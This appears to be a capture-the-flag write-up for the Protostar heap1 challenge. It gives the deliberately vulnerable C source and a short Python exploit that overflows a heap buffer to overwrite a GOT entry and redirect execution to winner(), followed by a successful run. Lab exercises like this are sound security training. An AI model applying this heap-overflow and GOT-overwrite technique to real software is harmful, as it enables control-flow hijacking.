Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

Here is the exploit script (saved as `heap1.exp.py`):
```python
import struct

winner=0x8048494
i1_name_arr=0x804a018
i2=0x804a028
i2_name_ptr=i2+4
got_puts=0x80483cc # writing at PLT doesn't work bcoz it's text section.
got_puts=0x8049774 # works
print 'a'*(i2_name_ptr-i1_name_arr)+struct.pack('<I', got_puts)+' '+struct.pack('<I', winner)
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python ~/heap1.exp.py | xargs ./heap1
and we have a winner @ 1593736258
```
